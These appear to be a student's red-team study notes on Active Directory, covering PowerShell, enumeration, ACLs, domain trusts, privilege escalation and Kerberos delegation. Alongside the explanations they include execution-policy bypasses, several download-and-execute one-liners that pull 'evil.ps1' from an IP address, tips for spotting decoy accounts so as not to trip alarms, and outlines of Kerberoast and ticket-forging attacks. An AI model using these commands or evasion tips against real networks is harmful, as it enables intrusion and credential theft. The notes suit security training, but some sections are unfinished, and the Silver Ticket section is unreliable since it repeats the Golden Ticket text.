
# introduction
- Everything in active directory is an object
- Object contains informations
- Object have different attributes and properties


## Active directory components
1. Schema - defines objects and their attributes
2. Query and index mechanism - searching and publication of objects and their properties
3. Global catalog - Contains info about every object in the directory
4. Replication Service - Replicate information across different Multiple domain controllers 

## Structure
- Forest contains multiple Domains. Domains contain multiple OUs.s


## What is powershell
- Provides access to anything in windows environment
- Run powerful scripts
- Based on .NET framework



### PowerShell Cmdlets
```
Get-Command -CommandType cmdlet
```

### PowerShell Execution Policy
- Not a security measure
- By default this is disabled to prevent user from accidentally executing scripts
- To bypass
```
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"

```

### PowerShell Modules
To import module use 
`Import-Module <modulepath>` 
once import we can list all commands using 
`Get-Command -Module <modulename>`


### How to execute powershell

```
iex (New-Object New.WebClient).DownloadString('https://webserver/payload.ps1')

$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

# for PSv3 onwards 
iex (iwr 'http://192.168.230.1/evil.ps1')

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText

$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

```

### How to interact with AD using Powershell
- ADSI
- .NET Classses System.DirectoryServices.ActiveDirectory
- Native Executable
- PowerShell (.NET Classes and WMI)


## Methodology - Assume Breach (Microsoft Cloud red teaming)
- It is more likely that an organization has already been compromised, but just hasn't discovered it yet

- Assuming that the attacker has already breached

- Red teaming > Insider Attack Simulation > Blue Teaming

1. Recon
2. Domain Enum
3. Local Priv Esc
4. Admin Recon
5. Lateral Movement > Domain Admin Privs > Cross Trust Attacks
6. Persist and Exfiltrate


# 1 - AD Enumeration

Getting basic domain info
```
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

## How?
1. PowerView.ps1 
2. (or) ActiveDirectory PowerShell module

## Looking at 'pwdlastset' and 'badpwdcount' or 'logongcount'
- Many organisations use tools to detect attackers and often use decoy users or 'honey credentials' that would look very enticing for an attacker. Enumerating these accounts would actually set off an alarm.
- Looking at these 'pwdlastset' and 'badpwdcount' can give indicators and differentiate what are decoy users and actual users.
- For an instance, a user with a password last set few years ago (and not changed) are very likely to be decoy users - an organisation would have password policy to make sure password changes takes place
- Also, a real user would have instances of keying in wrong password entries when attempting to login (which will increase a 'badpwdcount') whereas a fake user would highly not have a 'badpwdcount' at all. Similarly, a user with very low 'logoncounts' could likely mean that the user is not actively used or possibly a decoy user.

## Computer objects
- It is not necessary that a computer object (as listed in the Get-NetComputer command) is an actual Host/Computer/VM. It could be just an Object that is created by the administrator

# AD Enumeration GPO

## What are GPO
- Allows ability to manage configurations changes centrally distributed to multiple machines
- GPO can also be abused (eg as a domain admin) to centrally pushed backdoors, privesc to all machines in the domain


# AD Enumeration ACL

## How does access control work in domain environment?
Understanding the Access Control Model
1. Access Tokens 
	- has Identity of principal (user)
	- has Privileges of user

2. Security Descriptors
	- has **SID** of owner (security identifier)
	- has **DACL** (Discretionary Access control list)
			-  Access control list (ACL) is a list of permissions or who has permission to access the object
	- has **SACL** (System Access control list)
			- Controls audit policy of the object (eg. success or failure for a right)
	- DACL and SACL consists of one-to-many **ACE** or individual entry

- Whenever a process want to access any object in domain, it presents its **(1) access token** to the object
- The object which process is trying to access, has **(2) security descriptors**

### Understanding ACL
- Access control list (ACL) are vital to security architecture of AD
- There are 2 types of ACL
	- DACL - defines permission trustees (a user or group) have on an object
	- SACL - Logs success and failure audit messages when an object is accessed

### Understanding DACL
- You have a physical access card that authorizes you into an office, however, you are only allowed to enter a specific office room 11 (eg. not the CTO office)
- You tap the access card to a card reader, it beeps, and proceeds to unlock the door for your entry. 
- This was what happened:
	1. When you presented your access card to the card reader object (the same way a process that access an object in domain, it presents its **(1) Access token** which contains information about your identity and your privilege such as only access to room 11)
	2. The card reader reads the information (your identity and privileges) and the Access control checks what are the identity and your permission has (eg. can you enter room11 ? can you enter CTO office?) In the same way, the target object checks your identity and privileges against its list of permissions it has for each and every object - This list is also known as DACL

### Undertanding ACE
- Each ACL contains a list of entries and each of these entries are also known as ACE (Access control entries)
- ACE corresponds to individual permission or audit access. Eg. Who has permission and what can be done to an object?


# AD Enumeration - Trusts
- Trust is between 2 domain or 2 forests, which allows one to access resources from another
- Trust can be automatic (parent-child, same forest etc) or across forest
- **TDO** (Trusted Domain Object) represents the trust relationship in a domain

## Understanding Trusts

### Properties of Trust
- **One-way trust** - Unidirectional. Users in trusted domain can access resources in the trusting domain, but not reverse. For example
	- A Domain ---> Trusts ---> B Domain.  
	- A Domain --X--> Cannot access --X--> B Domain 
	- A Domain <--- Can access <--- B Domain
- **Two-way trust** - Bi-directional. Users of both domains can access resources in other domain.
- Trust Transitivity 
	-  **Transitive** - means can be extended to establish trust relationships with other domains
		- All default intra-forest trust relationships (Tree-root, Parent-child) between domains within a same forest are transitive two-way trusts. For example:	
		- Domain A <-- Trusts --> Domain B 
		- Domain B <-- Trusts --> Domain C
		- Domain A <-- Trusts --> Domain C (because of trust transitivity)
	- **Nontransitive** - Cannot be extended to other domains in the forest. Can be two-way or one-way
	
## What type of Trusts

### Domain Trusts

- Default/Automatic Trusts
	- Parent-child trust - Created automatically between new domain and the domain that precedes it.
	- Eg. Parent domain is _moneycorp.local_ and its child would be _dollarcorp.moneycorp.local_
	- This trust is always two-way transitive
	- Tree-root trust - Created automatically when a new domain is added to a forest root
-  Shortcut Trusts
	-  Used to reduce access times in complex trust scenarios
	-  Can be one-way or two-way transitive
-  External Trusts
	-  Between 2 domains in different forests that do not have a trust relationship (root domain)
	-  Can be one-way or two-way and is always nontransitive

### Forest Trusts
- Between forest root domain
- Cannot be extended to a third forest 
- Can be one-way or two-way
- Can be transitive or nontransitive


# Privilege Escalation
## Having local administrator privilege
One to easiest way for privilege escalation to domain admin

- Look for machine where Domain Admin Token or credential (or session) is available
- And we also have Local Admin privileges on that particular machine too
- Using the Local Admin we have on that box, we can extract credentials (TGTS, NTLM hashes or AES keys etc) of Domain Admin


## Various ways of Local PrivEsc
- Missing patches
- Automated deployment and autologon passwords in cleartext
- AlwaysInstallElevated (any user can run MSI as SYSTEM)
- Misconfigured Services
- DLL Hijacking and more


## Tools Used
- PowerUp (https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)
- BeRoot (https://github.com/AlessandroZ/BeRoot)
- Privesc (https://github.com/enjoiz/Privesc)


## Unquoted Service path vulnerability

### Pre-requisite for exploiting this
1. Privileges that the services is running should have higher privilege than your current user eg. `StartName	: LocalSystem`
2. You also have the ability to restart service (or you are able to wait for the machine to restart or rebooted) `CanRestart	: True`

### How it works?
In an example, if there is a executable file that is unquoted eg.

```powershell
C:\Folder\FTP Server\fillezilla.exe

# To exploit this unquoted service path
C:\Folder\FTP.exe
```

And there is a file named FTP.exe that is dropped there by a hacker. Whenver the unquoted service is being restarted or run, windows will run `C:\Folder\FTP.exe`

This is how windows works and it treats end of the space as the end and assumes that that is the path (before the space) that belongs to service.

You can inspect the services path names by using
`Get-WmiObject -CLass win32_service | fl *`


# How Kerberos works

- Kerberos is the basis of authentication in a Windows Active Directory

Components:
1. Client
2. KDC/DC (Key distribution center/Domain controller)
3. Application Server
4. TGT (Ticket Granting ticket)
5. TGS (Ticket Granting server)

## Kerberos authentication flow
1. Client sends -> AS-REQ -> KDC/DC 
Password in NTLM hash format is used to encrypt a timestamp and sent to KDC this is known as AS-REQ

2. Client receives <- AS-REP <- KDC/DC
The TGT is encrypted, signed and delivered to the user (AS-REP). Only KRBTGT can open and read TGT data

**IMPORTANT: Targeted Kerberoast ASREP attack abuses this step. If "pre-auth" is disabled, anyone can requests ASREP, which can allow attack to get the ASREP which contains the TGT encrypted with victim's NTLM hash. Allowing us to crack the password for it.**

3. Client sends -> TGS-REQ -> KDC/DC
Using step 2 TGT that is encrypted with KRBTGT hash, client requests a TGS ticket (TGS-REQ) to asks for permission to access a service

**IMPORTANT: The only validation here - As long as the KDC can decrypt the TGT with its own KRBTGT hash, it does not check the contents validity. This is also abused through the Golden Ticket method. The GoldenTicket attack abuses this step.**

4. Clients receives <- TGS-REP <- KDC/DC
The TGS is encrypted with the target services's NTLM hash (TGS-REP) which can only be decrypted by the target Application Server

**IMPORTANT: Kerberoast attack abuses this step. After geting the TGS-REP which is supposedly encrypted target server ntlm, we try to crack the password offline.**

5. Clients shows -> AP-REQ -> Application Server
Clients presents the TGS (AP-REQ) to application server which grants access to service.

**IMPORTANT: If we have the NTLM hash of the Target Service, we can forge a ticket of any users to gain access to the application server. The SilverTicket attack abuses this step. **

6. (optional) Client <- Optional Mutual Authentication <- Application Server 


# About Golden Ticket
- Most KRBTGT validity period are 10 years by default. Single password changes also does not prevent a KRBTGT hash being invalidated as authentication mechanism looks at the old hashes value if they fail to authenticate.
- Recommend to 

# About Silver Ticket
- Most KRBTGT validity period are 10 years by default. Single password changes also does not prevent a KRBTGT hash being invalidated as authentication mechanism looks at the old hashes value if they fail to authenticate.


# How Kerberos Delegation works
There are two types of Kerberos Delegation:
- General/Basic or Unconstrained Delegation which allows the first hop server (web server in our example) to request access to any service on any computer in the domain.
- Constrained Delegation which allows the first hop server (web server in ourexample) to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers Protocol Transition to transition the request to Kerberos.

		Please note that in both types of delegations, a mechanism is require to impersonate the incoming user and authenticate to the second hop server (Database server in our example) as the user.

 - When unconstrained delegation is enabled, the DC places user's TGT inside TGS (Step 4 in the previous diagram). When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user.
- This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine.

## Unconstrained Delegation
1. User provides credentials -> DC
2. User gets <- TGT from DC
3. User requests TGS for webserver -> DC
4. User gets <- TGS from DC
5. User sends TGT and TGS -> web server
6. Web server service account use TGT to request TGS for DB server from -> DC
7. Web server service account connects -> database server as the user

		Note: the Webserver at step 6 is 'impersonating' as the User to access the database server **as** the user. This is known as 2-hops


## Constrained Delegation
![[Pasted image 20210920143632.png]]

1. Client access webserver websvc (using non kerberos auth methods)
2. Websvc requests TGT (on behalf of client) -> KDC 
3. Websvc gets checked <- (userAccountControl have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) <- if yes, forwardeable ticket is returned from KDC (**S4U2Self**)
4. Websvc requests for TGS (on behalf of client with ticket) -> KDC
5. Websvc gets checked <- (msDS-AllowedToDelegateTo) <- if listed, return a service ticket (**S4U2Proxy**)
6. Websvc can now authenticate to -> desired service while impersonating as Client